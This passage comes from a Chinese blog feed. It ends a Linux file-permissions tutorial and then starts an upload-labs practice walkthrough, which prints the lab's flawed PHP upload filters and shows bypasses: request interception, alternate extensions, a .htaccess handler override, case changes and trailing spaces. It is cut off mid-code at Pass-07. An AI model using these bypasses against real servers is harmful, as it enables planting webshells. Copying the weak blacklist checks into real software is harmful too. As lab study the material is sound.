title="第一栏：文件类型权限"></a>第一栏：文件类型权限</h4><p>共有<strong>十个</strong>字符</p><p><strong>第一个</strong>字符代表这个文件是<strong>目录，文件或链接文件</strong>等</p><p><code>[d]</code>代表目录，<code>[-]</code>代表文件，<code>[l]</code>表示链接文件</p><p>接下来的字符，以<strong>三个</strong>为<strong>一组</strong>，且均为<code>[rwx]</code>的三个参数的组合，其中<code>[r]</code>代表<strong>可读</strong>（read），<code>[w]</code>代表<strong>可写</strong>（write），<code>[x]</code>代表<strong>可执行</strong>（execute），如果没有权限则会出现减号<code>[-]</code>。第一组代表<strong>文件拥有者可具备的权限</strong>，第二组代表<strong>加入此用户组之账号的权限</strong>，第三组代表<strong>非本人且没有加入本用户组的其他账号的权限</strong></p><p>十个字符整理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr--</span><br></pre></td></tr></table></figure><p>意义是这是一个文件，文件拥有者具有可读，可写和可执行的权限。同用户组的用户具有可读和可执行的权限，其他用户具有只读的权限</p><h4 id="第二栏：链接数"><a href="#第二栏：链接数" class="headerlink" title="第二栏：链接数"></a>第二栏：链接数</h4><p>每个文件都会讲它的权限与属性记录到文件系统的<strong>inode</strong>中，这个属性记录的就是有多少不同的文件名链接到同一个inode中</p><h4 id="第三栏：文件的拥有者"><a href="#第三栏：文件的拥有者" class="headerlink" title="第三栏：文件的拥有者"></a>第三栏：文件的拥有者</h4><h4 id="第四栏：文件所属的用户组"><a href="#第四栏：文件所属的用户组" class="headerlink" title="第四栏：文件所属的用户组"></a>第四栏：文件所属的用户组</h4><p>在Linux系统中，你的账号会加入一个或多个用户组中，假如用户组具有可读可写权限，则该用户组中的每个用户都具有可读可写权限</p><h4 id="第五栏：文件大小"><a href="#第五栏：文件大小" class="headerlink" title="第五栏：文件大小"></a>第五栏：文件大小</h4><p>默认单位为<strong>Bytes</strong></p><h4 id="第六栏：文件创建日期或最后被修改的日期"><a href="#第六栏：文件创建日期或最后被修改的日期" class="headerlink" title="第六栏：文件创建日期或最后被修改的日期"></a>第六栏：文件创建日期或最后被修改的日期</h4><h4 id="第七栏：文件名"><a href="#第七栏：文件名" class="headerlink" title="第七栏：文件名"></a>第七栏：文件名</h4><h3 id="2-修改文件属性与权限"><a href="#2-修改文件属性与权限" class="headerlink" title="2.修改文件属性与权限"></a>2.修改文件属性与权限</h3><p><code>chgrp</code>：修改文件所属用户组</p><p><code>chown</code>：修改文件拥有者</p><p><code>chmod</code>：修改文件权限</p><h4 id="修改所属用户组"><a href="#修改所属用户组" class="headerlink" title="修改所属用户组"></a>修改所属用户组</h4><p>使用<code>chgrp</code>命令，前提是修改的用户组必须在<strong>/etc/group</strong>文件中存在才行，命令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chgrp groupname dirname/filename</span><br><span class="line">root@ubuntu:~# chgrp test .config</span><br></pre></td></tr></table></figure><h4 id="修改文件拥有者"><a href="#修改文件拥有者" class="headerlink" title="修改文件拥有者"></a>修改文件拥有者</h4><p>使用<code>chown</code>命令，前提修改的用户必须在<strong>/etc/passwd</strong>文件中存在才行，命令格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chown 账号名称 文件或目录</span><br><span class="line">root@ubuntu:~# chown 账号名称：用户组名称 文件或目录</span><br><span class="line">root@ubuntu:~# chown test01 .config</span><br><span class="line">root@ubuntu:~# chown test01:test .config</span><br></pre></td></tr></table></figure><h4 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h4><p>使用<code>chmod</code>命令，设置方法有两种，分别可以用数字或是符号来进行权限的修改</p><h5 id="数字类型修改文件权限"><a href="#数字类型修改文件权限" class="headerlink" title="数字类型修改文件权限"></a>数字类型修改文件权限</h5><p>各权限的数字对照表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r：4</span><br><span class="line">w：2</span><br><span class="line">x：1</span><br></pre></td></tr></table></figure><p>每种身份（owner，group，others）各自的三个权限（r，m，x）数字是需要<strong>累加</strong>的，例如当权限为：<code>[-rwxrwx---]</code>数字则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner = rwx = 4+2+1 = 7</span><br><span class="line">group = rwx = 4+2+1 = 7</span><br><span class="line">others = --- = 0+0+0 = 0</span><br></pre></td></tr></table></figure><p>所以我们设置权限时，该文件的权限数字就是<strong>770</strong>，chmod语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod xyz 文件或目录</span><br><span class="line">root@ubuntu:~# chmod 777 .config</span><br></pre></td></tr></table></figure><h5 id="符号类型修改文件权限"><a href="#符号类型修改文件权限" class="headerlink" title="符号类型修改文件权限"></a>符号类型修改文件权限</h5><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod 身份 权限操作 权限 文件或目录</span><br></pre></td></tr></table></figure><p>参数具体为：</p><p>（1）身份：<code>u</code>即user，<code>g</code>即用户组，<code>o</code>即其他人，<code>a</code>代表全部身份</p><p>（2）权限操作：<code>+</code>即加入，<code>-</code>即移除，<code>=</code>即设置</p><p>（3）权限：<code>rmx</code></p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# chmod u=rwx,go=rx .config</span><br></pre></td></tr></table></figure><h3 id="3-目录与文件的权限意义"><a href="#3-目录与文件的权限意义" class="headerlink" title="3.目录与文件的权限意义"></a>3.目录与文件的权限意义</h3><h4 id="权限对文件的意义"><a href="#权限对文件的意义" class="headerlink" title="权限对文件的意义"></a>权限对文件的意义</h4><p>r（read）：可读取此文件的实际内容</p><p>w（write）：可以编辑，新增或是修改该文件的内容（但不含删除该文件）</p><p>x（execute）：该文件具有可以被系统执行的权限</p><h4 id="权限对目录的意义"><a href="#权限对目录的意义" class="headerlink" title="权限对目录的意义"></a>权限对目录的意义</h4><p>r（read）：表示具有读取目录结构列表的权限，如使用ls命令将该目录的内容列表显示出来</p><p>w（write）：具有改动该目录结构列表的权限</p><p>x（execute）：用户具有进入该目录的权限，如使用cd命令进入某个目录列表</p>]]></content>
    
    <summary type="html">
    
      Linux
    
    </summary>
    
      <category term="Linux" scheme="https://Foxgrin.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://Foxgrin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞--upload-labs</title>
    <link href="https://Foxgrin.github.io//posts/49857/"/>
    <id>https://Foxgrin.github.io//posts/49857/</id>
    <published>2019-03-02T14:05:00.000Z</published>
    <updated>2019-03-05T12:03:57.574Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传练习靶场–upload-labs通关记录以及对文件上传漏洞的总结<a id="more"></a></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>直接上传php文件，出现弹框提示上传失败</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>尝试抓包，但是因为弹框未抓到上传文件的包，所以猜测是前端JS代码对文件进行了检测，直接查看网页源代码，发现检测JS代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    function checkFile() &#123;</span></span><br><span class="line"><span class="undefined">        var file = document.getElementsByName('upload_file')[0].value;</span></span><br><span class="line"><span class="undefined">        if (file == null || file == "") &#123;</span></span><br><span class="line"><span class="undefined">            alert("请选择要上传的文件!");</span></span><br><span class="line"><span class="undefined">            return false;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        //定义允许上传的文件类型</span></span><br><span class="line"><span class="undefined">        var allow_ext = ".jpg|.png|.gif";</span></span><br><span class="line"><span class="undefined">        //提取上传文件的类型</span></span><br><span class="line"><span class="undefined">        var ext_name = file.substring(file.lastIndexOf("."));</span></span><br><span class="line"><span class="undefined">        //判断上传文件类型是否允许上传</span></span><br><span class="line"><span class="undefined">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span></span><br><span class="line"><span class="undefined">            var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;</span></span><br><span class="line"><span class="undefined">            alert(errMsg);</span></span><br><span class="line"><span class="undefined">            return false;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码大致流程是对比文件名的最后一个后缀是否是jpg,png,gif，如果不是则前端拦截文件，上传失败。</p><p>既然是前端进行，我们只要绕过前端，再利用抓包修改文件名后缀，即可成功上传PHP文件。我们先上传一个后缀名为JPG，内容为PHP代码的文件<strong>1cmd.jpg</strong>，再通过抓包修改文件名为<strong>1cmd.php</strong>，过程如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>直接上传PHP文件，提示文件类型错误，猜测后台代码对文件类型进行了检测，抓包修改文件类型为<strong>image/jpeg</strong>，如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>本关检测代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];          </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>上传PHP文件，提示禁止不允许上传.asp,.aspx,.php,.jsp后缀文件 ，尝试修改文件名为<strong>.jpg.php</strong>，修改文件类型，大写PHP，都失败，猜测后台代码将文件名的最后一个”.”后作为检测目标。后台过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了后缀名为.asp,.aspx,.php,.jsp的文件，但是没有过滤<strong>phtml</strong>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传成功<a href="http://127.0.0.1/upload-labs/upload/201903031949124726.phtml" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/201903031949124726.phtml</a></p><p>另外修改后缀名为<strong>php3</strong>也可以</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>上传php，phtml，php3等文件都失败，过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>黑名单几乎过滤掉了所有问题后缀名，但是唯独没有过滤<strong>.htaccess</strong>文件，我们上传一个<strong>.htaccess</strong>文件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传之后，该路径下所有文件都会被解析成PHP格式文件，我们再上传包含PHP代码的图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://127.0.0.1/upload-labs/upload/4cmd.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/4cmd.jpg</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>跟上一关区别的是黑名单又增加了.htaccess文件，过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>但是仔细观察发现这关并没有将上传文件的后缀名通过<strong>strtolower</strong>进行大小写转化的处理，所以很简单，上传一个<strong>.PHP</strong>文件即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>黑名单一样，并对文件名进行小写转化处理，但是未对文件名通过<strong>trim</strong>函数进行去空处理，所以对后缀名进行加空，即可上传成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span 